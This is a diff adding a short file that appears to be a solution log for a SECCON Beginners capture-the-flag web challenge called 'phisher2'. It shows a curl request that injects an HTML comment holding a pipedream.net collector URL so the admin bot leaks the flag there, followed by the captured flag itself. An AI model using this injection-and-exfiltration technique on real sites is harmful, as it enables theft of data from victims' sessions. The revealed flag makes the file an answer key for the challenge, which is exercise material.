@@ -1,0 +1,5 @@
+$ curl -X POST -H "Content-Type: application/json" -d '{"text":"<!-- https://xxxxxxxxxxxxxxx.m.pipedream.net/x --> https://phisher2.beginners.seccon.games/"}' https://phisher2.beginners.seccon.games
+{"input_url":"<!-- https://xxxxxxxxxxxxxxx.m.pipedream.net/x --> https://phisher2.beginners.seccon.games/","message":"admin: Very good web site. Thanks for sharing!","ocr_url":"https://phisher2.beginners.seccon.games/"}
+
+https://xxxxxxxxxxxxxxx.m.pipedream.net/x?flag=ctf4b%7Bw451t4c4t154w?%7D
+
